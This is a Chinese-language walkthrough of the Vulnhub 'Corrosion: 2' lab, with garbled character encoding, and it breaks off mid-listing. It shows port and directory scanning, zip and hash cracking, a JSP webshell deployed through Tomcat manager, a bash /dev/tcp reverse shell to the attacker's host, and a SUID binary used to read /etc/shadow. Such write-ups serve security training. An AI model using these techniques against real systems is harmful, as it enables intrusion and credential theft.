{"pageProps":{"postData":{"id":"VulnhubCorrosion 2","contentHtml":"<h1>Corrosion: 2</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/corrosion-2,745/\">https://www.vulnhub.com/entry/corrosion-2,745/</a></p>\n</blockquote>\n<p>æç¤ºï¼šæšä¸¾æ‰æ˜¯ç¥</p>\n<h2>ä¸»æœºå‘ç°ç«¯å£æ‰«æ</h2>\n<ol>\n<li>\n<p>ä½¿ç”¨nmapæ‰«æç½‘æ®µç±»å­˜æ´»ä¸»æœº</p>\n<p>å› ä¸ºé¶æœºæ˜¯æˆ‘æœ€åæ·»åŠ çš„ï¼Œæ‰€ä»¥é¶æœºIPæ˜¯<code>6</code> ï¼Œ<code>kali</code>æ˜¯<code>10</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:50 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00048</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00040</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:E5:<span class=\"hljs-number\">3</span>B:<span class=\"hljs-number\">06</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00055</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">3</span>A:<span class=\"hljs-number\">6</span>B (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\n</code></pre>\n</li>\n<li>\n<p>æ‰«æä¸»æœºå¼€æ”¾ç«¯å£</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:51 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">8080</span>/tcp open  http-proxy\n</code></pre>\n</li>\n<li>\n<p>æ‰«æä¸»æœºæœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:52 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00052</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">3</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\n<span class=\"hljs-number\">8080</span>/tcp open  http    Apache Tomcat <span class=\"hljs-number\">9.0</span>.<span class=\"hljs-number\">53</span>\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">3</span>A:<span class=\"hljs-number\">6</span>B (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">5.0</span> - <span class=\"hljs-number\">5.5</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>æ‰«ææ¼æ´</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">52</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00053</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n8080/tcp open  http-proxy\n| http-enum: \n|   /backup.zip: Possible backup\n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 )\n|   /manager/html: Apache Tomcat (401 )\n|_  /docs/: Potentially interesting folder\nMAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n</li>\n</ol>\n<h2>webæ¸—é€</h2>\n<h3>80 ç«¯å£</h3>\n<ol>\n<li>\n<p>è®¿é—®ä¸»é¡µæ˜¯<code>Apache</code>é»˜è®¤é¡µé¢</p>\n</li>\n<li>\n<p>æ‰«æç›®å½•</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>\n,txt\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.html                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/index.html           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">10918</span>]\n/.html                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/server-status        (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>æ²¡æ‰«æå‡ºä»€ä¹ˆï¼Œå…ˆæ”¾ç€</p>\n</li>\n</ol>\n<h3>8080 ç«¯å£</h3>\n<ol>\n<li>\n<p>è®¿é—®æ—¶<code>Tomcat</code>çš„é»˜è®¤é¡µé¢</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image89.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>äºŒè¯ä¸è¯´ï¼Œæ‰«ç›®å½•</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>:<span class=\"hljs-number\">8080</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt                                                                 <span class=\"hljs-number\">22</span>:05:<span class=\"hljs-number\">48</span> [<span class=\"hljs-number\">45</span>/<span class=\"hljs-number\">161</span>]\n===============================================================                                                                                                                                                   \nGobuster v3<span class=\"hljs-number\">.6</span>                                                                                                                                                                                                     \nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)                                                                                                                                                     \n===============================================================                                                                                                                                                   \n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>:<span class=\"hljs-number\">8080</span>                                                                                                                                                             \n[+] Method:                  GET                                                                                                                                                                                  \n[+] Threads:                 <span class=\"hljs-number\">10</span>                                                                                                                                                                                   \n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt                                                                                                                         \n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>                                                                                                                                                                                  \n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>                                                                                                                                                                         \n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt                                                                                                                                                                     \n[+] Timeout:                 10s                                                                                                                                                                                  \n===============================================================                                                                                                                                                   \nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode                                                                                                                                                                   \n===============================================================                                                                                                                                                   \n/docs                 (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /docs/]                                                                                                                                                        \n/examples             (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /examples/]                                                                                                                                                    \n/backup.<span class=\"hljs-built_in\">zip</span>           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">33723</span>]                                                                                                                                                                 \n/readme.txt           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">153</span>]                                                                                                                                                                   \n/manager              (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /manager/] \n/RELEASE-NOTES.txt    (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">6898</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)                                                                    \n===============================================================                                                                                                                                                   \nFinished                                            \n=============================================================== \n</code></pre>\n<p>æˆ‘å·²ç»æŠŠ<code>404</code>çŠ¶æ€ç çš„è¿‡æ»¤äº†</p>\n<ul>\n<li>\n<p><code>/docs</code> ä¸º<code>tomcat</code>çš„æ–‡æ¡£</p>\n</li>\n<li>\n<p><code>/examples/</code>æ˜¯<code>tomcat</code>ä¾‹å­</p>\n</li>\n<li>\n<p><code>/backup.zip</code> å‹ç¼©åŒ…å†…å®¹åº”è¯¥æ˜¯å¤‡ä»½çš„ï¼Œè§£å‹éœ€è¦å¯†ç </p>\n</li>\n<li>\n<p><code>readme.txt</code> æˆ‘ä»¥ä¸ºæ˜¯å®˜æ–¹æ–‡æ¡£</p>\n<pre><code class=\"hljs language-python\">Hey randy! It<span class=\"hljs-string\">'s your System Administrator. I left you a file on the server, I'</span>m sure nobody will find it.\nAlso remember to use that password I gave you.\nå˜¿ï¼Œå…°è¿ªï¼æˆ‘æ˜¯ä½ çš„ç³»ç»Ÿç®¡ç†å‘˜ã€‚æˆ‘åœ¨æœåŠ¡å™¨ä¸Šç»™ä½ ç•™äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ç›¸ä¿¡æ²¡äººèƒ½æ‰¾åˆ°å®ƒã€‚\nå¦å¤–è®°å¾—ä½¿ç”¨æˆ‘ç»™ä½ çš„å¯†ç \n</code></pre>\n</li>\n<li>\n<p><code>/manager</code> éœ€è¦æä¾›è´¦å·å¯†ç </p>\n</li>\n</ul>\n</li>\n<li>\n<p>æš‚æ—¶æ²¡ä»€ä¹ˆçº¿ç´¢ï¼Œæƒ³å°è¯•çˆ†ç ´å‡ºå‹ç¼©åŒ…çš„å¯†ç </p>\n<ul>\n<li>\n<p>ä½¿ç”¨<code>fcrackzip</code></p>\n<pre><code class=\"hljs language-python\">crackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.<span class=\"hljs-built_in\">zip</span>\n\nPASSWORD FOUND!!!!: pw == @administrator_hi5\n</code></pre>\n<p>è§£å‡ºå¯†ç  <code>@administrator_hi5</code></p>\n</li>\n<li>\n<p>è§£å‹å‹ç¼©åŒ…ï¼Œè¾“å‡ºç ´è§£å‡ºçš„å¯†ç </p>\n<pre><code class=\"hljs language-python\">unzip backup.<span class=\"hljs-built_in\">zip</span> -d backup  \nArchive:  backup.<span class=\"hljs-built_in\">zip</span>\n[backup.<span class=\"hljs-built_in\">zip</span>] catalina.policy password: \n  inflating: backup/catalina.policy  \n  inflating: backup/context.xml      \n  inflating: backup/catalina.properties  \n  inflating: backup/jaspic-providers.xml  \n  inflating: backup/jaspic-providers.xsd  \n  inflating: backup/logging.properties  \n  inflating: backup/server.xml       \n  inflating: backup/tomcat-users.xml  \n  inflating: backup/tomcat-users.xsd  \n  inflating: backup/web.xml\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>è§£å‹åå‘ç°å­˜åœ¨<code>tomcat-users.xml</code>ä»¥åŠ<code>tomcat-users.xsd</code> ï¼Œé…ç½®tomcatç”¨æˆ·åŠå…¶è§’è‰²ï¼Œé€šå¸¸ç”¨äºç®¡ç†åå°çš„è®¿é—®æƒé™</p>\n<pre><code class=\"hljs language-python\">&#x3C;role rolename=<span class=\"hljs-string\">\"manager-gui\"</span>/>\n&#x3C;user username=<span class=\"hljs-string\">\"manager\"</span> password=<span class=\"hljs-string\">\"melehifokivai\"</span> roles=<span class=\"hljs-string\">\"manager-gui\"</span>/>\n\n&#x3C;role rolename=<span class=\"hljs-string\">\"admin-gui\"</span>/>\n&#x3C;user username=<span class=\"hljs-string\">\"admin\"</span> password=<span class=\"hljs-string\">\"melehifokivai\"</span> roles=<span class=\"hljs-string\">\"admin-gui, manager-gui\"</span>/>\n</code></pre>\n<p>çš„åˆ°å¯†ç <code>melehifokivai</code> ï¼Œä¸¤ä¸ªç”¨æˆ·å<code>admin</code>å’Œ<code>manager</code> ï¼Œå‡å°è¯•äº†<code>ssh</code>ç™»å½•æ— æœ</p>\n</li>\n<li>\n<p>è®¿é—®<code>/manager</code> æäº¤å¾—åˆ°çš„è´¦å·å¯†ç ï¼ŒæˆåŠŸè¿›å…¥ä½¿ç”¨äº†<code>admin</code>å’Œ<code>melehifokivai</code></p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image90.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>åå°åˆ©ç”¨</h2>\n<ol>\n<li>\n<p>è¿›å…¥äº†<code>tomcat</code>çš„åå°ï¼Œæ¶‰åŠåˆ°<code>tomcat</code>åå°çš„åˆ©ç”¨</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_41924764/article/details/108196725\">https://blog.csdn.net/weixin_41924764/article/details/108196725</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_43615820/article/details/116357744\">https://blog.csdn.net/qq_43615820/article/details/116357744</a> è¿™é‡Œä½¿ç”¨çš„æ˜¯JSPçš„ä¸€å¥è¯æœ¨é©¬</p>\n</blockquote>\n</li>\n<li>\n<p>å¤åˆ¶æ¶æ„ä»£ç å­˜ä¸ºæ–‡ä»¶<code>2131.jsp</code> ï¼Œå¹¶ä½¿ç”¨<code>jar</code>åˆ¶ä½œ<code>war</code>åŒ…</p>\n<pre><code class=\"hljs language-python\">jar cvf <span class=\"hljs-number\">2131.</span>war <span class=\"hljs-number\">2131.j</span>sp\n</code></pre>\n</li>\n<li>\n<p>ç„¶åä¸Šä¼ <code>war</code>åŒ…</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image91.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>ä¸Šä¼ ä¹‹åä½¿ç”¨èšğŸ—¡è¿æ¥ï¼Œæµ‹è¯•æˆåŠŸ</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image92.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>ä½¿ç”¨èšğŸ—¡è™šæ‹Ÿç»ˆç«¯è¿›è¡Œåå¼¹<code>shell</code> ï¼ŒåŒæ—¶<code>kali</code>å¼€å¯ç›‘å¬</p>\n<pre><code class=\"hljs language-python\">(tomcat:/<span class=\"hljs-built_in\">bin</span>/sh: ) $ bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.10/1234 0>&#x26;1'</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>                             \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>] <span class=\"hljs-number\">58882</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">1277</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\ntomcat@corrosion:/var/spool/cron$ \n</code></pre>\n<p>è·å¾—shellï¼ï¼ï¼</p>\n</li>\n</ol>\n<h2>ææƒ - tomcatç”¨æˆ·</h2>\n<ol>\n<li>\n<p>æŸ¥çœ‹æƒé™</p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/var/spool/cron$ whoami\ntomcat\ntomcat@corrosion:/var/spool/cron$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1001</span>(tomcat) gid=<span class=\"hljs-number\">1001</span>(tomcat) groups=<span class=\"hljs-number\">1001</span>(tomcat)\ntomcat@corrosion:/var/spool/cron$ uname -a\nLinux corrosion <span class=\"hljs-number\">5.11</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">34</span>-generic <span class=\"hljs-comment\">#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>å¯»æ‰¾æ•æ„Ÿç›®å½•</p>\n<ul>\n<li>å®¶ç›®å½•ä¸‹å­˜åœ¨<code>jaye</code>æ–‡ä»¶å¤¹å’Œ<code>randy</code>æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­<code>jaye</code>æ²¡æœ‰è®¿é—®æƒé™ï¼Œåªèƒ½çœ‹<code>randy</code>çš„æ–‡ä»¶å¤¹\n<ul>\n<li>\n<p><code>note.txt</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat note.txt \nHey randy this <span class=\"hljs-keyword\">is</span> your system administrator, hope your having a great day! I just wanted to let you know\nthat I changed your permissions <span class=\"hljs-keyword\">for</span> your home directory. You won<span class=\"hljs-string\">'t be able to remove or add files for now.\n\nI will change these permissions later on.\n\nSee you next Monday randy!\nå˜¿ randy æˆ‘æ˜¯ä½ çš„ç³»ç»Ÿç®¡ç†å‘˜ï¼Œå¸Œæœ›ä½ ä»Šå¤©è¿‡å¾—æ„‰å¿«ï¼æˆ‘åªæ˜¯æƒ³è®©ä½ çŸ¥é“\næˆ‘æ›´æ”¹äº†ä½ çš„ä¸»ç›®å½•çš„æƒé™ã€‚ä½ ç°åœ¨æ— æ³•åˆ é™¤æˆ–æ·»åŠ æ–‡ä»¶ã€‚\n\næˆ‘ç¨åä¼šæ›´æ”¹è¿™äº›æƒé™ã€‚\n\nä¸‹å‘¨ä¸€è§ randyï¼\n</span></code></pre>\n</li>\n<li>\n<p><code>randombase64.py</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat randombase64.py \n<span class=\"hljs-keyword\">import</span> base64\nmessage = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Enter your string: \"</span>)\nmessage_bytes = message.encode(<span class=\"hljs-string\">'ascii'</span>)\nbase64_bytes = base64.b64encode(message_bytes)\nbase64_message = base64_bytes.decode(<span class=\"hljs-string\">'ascii'</span>)\n<span class=\"hljs-built_in\">print</span>(base64_message)\ntomcat@corrosion:/home/randy$ \n</code></pre>\n</li>\n<li>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat user.txt\nca73a018ae6908a7d0ea5d1c269ba4b6\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>æ“ä½œäº†ä¸€ç•ªè¿˜æ˜¯æ²¡æ‰¾åˆ°ææƒçš„åœ°æ–¹ï¼Œè®°å¾—ä¹‹å‰ç»™äº†ä¸€ä¸²å¯†ç <code>melehifokivai</code> ï¼Œåªå°è¯•äº†randyçš„ç”¨æˆ·è¿˜æœ‰<code>jaye</code>è´¦å·çš„æ²¡å°è¯•</p>\n<p>å°è¯•åœ¨<code>jaye</code>ä½¿ç”¨<code>ssh</code>ç™»å½•</p>\n<pre><code class=\"hljs language-python\">ssh jaye@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\njaye@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n$ \n\n</span></code></pre>\n<p>ç™»é™†æˆåŠŸ</p>\n</li>\n</ol>\n<h2>ææƒ - jayeç”¨æˆ·</h2>\n<ol>\n<li>\n<p>å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶</p>\n<ul>\n<li>\n<p>åœ¨å®¶ç›®å½•ä¸‹å­˜åœ¨<code>Files</code>æ–‡ä»¶å¤¹æƒé™æ˜¯<code>root</code>çš„ï¼Œé‡Œè¾¹å­˜åœ¨ä¸ªå¯æ‰§è¡Œæ–‡ä»¶<code>look</code> ï¼Œæ˜¯<code>root</code>æƒé™çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬æ‹¥æœ‰æ‰§è¡Œæƒé™ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>look</code>å‘½ä»¤æ¥è¯»å–<code>shadow</code>æ–‡ä»¶çš„å†…å®¹äº†</p>\n<pre><code class=\"hljs language-python\">---s--s--x  <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">14728</span> Sep <span class=\"hljs-number\">17</span>  <span class=\"hljs-number\">2021</span> look\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>ä½¿ç”¨<code>look</code>å‘½ä»¤è¯»å–<code>shadow</code>æ–‡ä»¶ï¼Œè¯»å–<code>root</code>ç”¨æˆ·ä»¥åŠ<code>randy</code>ç”¨æˆ·</p>\n<pre><code class=\"hljs language-python\">./look -f <span class=\"hljs-string\">\"root\"</span> /etc/shadow\nroot:$<span class=\"hljs-number\">6</span>$fHvHhNo5DWsYxgt0$<span class=\"hljs-number\">.3</span>upyGTbu9RjpoCkHfW<span class=\"hljs-number\">.1</span>F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK<span class=\"hljs-number\">.5</span>OR57.:<span class=\"hljs-number\">18888</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n./look -f <span class=\"hljs-string\">\"randy\"</span> /etc/shadow\nrandy:$<span class=\"hljs-number\">6</span>$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi<span class=\"hljs-number\">.61</span>HJ36qXGvFHJGY/:<span class=\"hljs-number\">18888</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<p>ä¿å­˜ä¸º<code>pass</code>æ–‡ä»¶æ”¾åˆ°<code>john</code>è¿›è¡Œçˆ†ç ´ï¼Œç ´è§£äº†äº”ä¸ªå¤šå°æ—¶ï¼Œä»…ç ´è§£äº†<code>randy</code>ç”¨æˆ·çš„å¯†ç </p>\n<pre><code class=\"hljs language-python\">07051986randy (randy)\n</code></pre>\n</li>\n<li>\n<p>ä½¿ç”¨å¯†ç ç™»å½•<code>ssh</code></p>\n<pre><code class=\"hljs language-python\">ssh randy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\nrandy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n</span></code></pre>\n</li>\n</ol>\n<h2>ææƒ - randyç”¨æˆ·</h2>\n<ol>\n<li>\n<p>æŸ¥çœ‹æƒé™</p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> randy: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> randy on corrosion:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser randy may run the following commands on corrosion:\n    (root) PASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.8</span> /home/randy/randombase64.py\n</code></pre>\n</li>\n<li>\n<p>æŸ¥çœ‹<code>/home/randy/randombase64.py</code> æ˜¯å¦æ‹¥æœ‰ä¿®æ”¹æƒé™</p>\n<pre><code class=\"hljs language-python\">-rwxr-xr-x  <span class=\"hljs-number\">1</span> root  root   <span class=\"hljs-number\">210</span> Sep <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2021</span> 